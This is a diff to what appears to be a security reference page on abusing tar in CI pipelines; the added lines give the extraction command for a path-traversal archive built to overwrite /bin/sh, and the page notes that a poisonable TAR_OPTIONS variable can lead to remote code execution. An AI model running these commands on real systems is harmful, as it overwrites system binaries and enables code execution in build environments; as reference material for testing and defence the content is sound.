@@ -20,6 +20,11 @@ To create a malicious archive:
 tar cPf zipslip.tar ../../../../../../bin/sh
 ```
 
+To poison:
+```
+tar xPf zipslip.tar
+```
+
 ## Environnement variable
 
 `tar` prepend **TAR_OPTIONS** env variable to every call. See [Using tar Options](https://www.gnu.org/software/tar/manual/html_section/using-tar-options.html). If the environment variable of a CI can be poison, **TAR_OPTIONS** can lead to RCE via:
